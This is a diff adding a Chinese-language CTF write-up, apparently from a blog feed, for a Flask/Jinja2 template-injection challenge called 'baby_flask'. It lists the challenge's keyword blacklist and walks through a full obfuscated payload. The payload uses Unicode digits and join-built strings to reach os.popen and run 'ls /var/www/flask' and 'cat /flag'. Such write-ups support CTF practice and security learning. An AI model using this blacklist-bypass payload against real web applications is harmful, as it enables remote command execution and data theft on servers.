@@ -9996,6 +9996,34 @@ for i in range(1,70):
         if &#39;wrong&#39; not in resp.text:
             flag = flag +j
             print(j)</code></pre>
+<h1 id="baby-flask"><a href="#baby-flask" class="headerlink" title="baby_flask"></a>baby_flask</h1><p>看源码发现过滤了如下</p>
+<pre><code>blacklist&lt;/br&gt;   
+&#39;.&#39;,&#39;[&#39;,&#39;\&#39;&#39;,&#39;&quot;&#39;,&#39;&#39;\\&#39;,&#39;+&#39;,&#39;:&#39;,&#39;_&#39;,&lt;/br&gt;   
+&#39;chr&#39;,&#39;pop&#39;,&#39;class&#39;,&#39;base&#39;,&#39;mro&#39;,&#39;init&#39;,&#39;globals&#39;,&#39;get&#39;,&lt;/br&gt;   
+&#39;eval&#39;,&#39;exec&#39;,&#39;os&#39;,&#39;popen&#39;,&#39;open&#39;,&#39;read&#39;,&lt;/br&gt;   
+&#39;select&#39;,&#39;url_for&#39;,&#39;get_flashed_messages&#39;,&#39;config&#39;,&#39;request&#39;,&lt;/br&gt;   
+&#39;count&#39;,&#39;length&#39;,&#39;０&#39;,&#39;１&#39;,&#39;２&#39;,&#39;３&#39;,&#39;４&#39;,&#39;５&#39;,&#39;６&#39;,&#39;７&#39;,&#39;８&#39;,&#39;９&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;&lt;/br&gt;    
+&lt;/br&gt;</code></pre><p>数字被过滤了可以使用这些特殊的数字来绕过</p>
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210328095013313.png" alt="image-20210328095013313"></p>
+<p>然后就可以使用<code>join</code>进行拼接构造出一些我们想要的字符</p>
+<pre><code class="python">{%set a=dict(po=aa,p=aa)|join%} # pop
+{%set b=lipsum|string|list|attr(a)(𝟙𝟠)%} # _
+{%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%} # globals
+{%set d=(b,b,dict(ge=cc,tit=dd,em=aa)|join,b,b)|join%} # getitem
+{%set e=dict(o=cc,s=aa)|join%} # os
+{%set f=lipsum|string|list|attr(a)(𝟡)%} # 空格
+{%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟠)%} # 斜杠
+{%set i=(dict(cat=aa)|join,f,g,dict(flag=aa)|join)|join%} # cat /flag
+{%set h=(a,dict(en=aa)|join|join)|join%} # popen
+{%set i=dict(re=aa,ad=aa)|join%} # read
+{%set z=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟝)%} #点
+{%set j=(dict(ls=aa)|join,f,g,(dict(var=aa)|join),g,(dict(www=aa)|join),g,(dict(flask=aa)|join)|join)|join%} #ls /var/www/flask
+{%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%}{{j}}
+#最后拼接起来
+#{{lipsum.__globals__['os'].popen('ls /var/www/flask').read()}}</code></pre>
+<p>最后的<code>payload</code>如下，成功执行<code>ls /var/www/flask</code>就可以看到<code>flag</code>了</p>
+<pre><code class="python">name={%set a=dict(po=aa,p=aa)|join%}{%set b=lipsum|string|list|attr(a)(𝟙𝟠)%}{%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%}{%set d=(b,b,dict(ge=cc,tit=dd,em=aa)|join,b,b)|join%}{%set e=dict(o=cc,s=aa)|join%}{%set f=lipsum|string|list|attr(a)(𝟡)%}{%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟠)%}{%set i=(dict(cat=aa)|join,f,g,dict(flag=aa)|join)|join%}{%set h=(a,dict(en=aa)|join|join)|join%}{%set i=dict(re=aa,ad=aa)|join%}{%set z=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟝)%}{%set j=(dict(ls=aa)|join,f,g,(dict(var=aa)|join),g,(dict(www=aa)|join),g,(dict(flask=aa)|join)|join)|join%}{%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%}{{j}}</code></pre>
+<p>### </p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
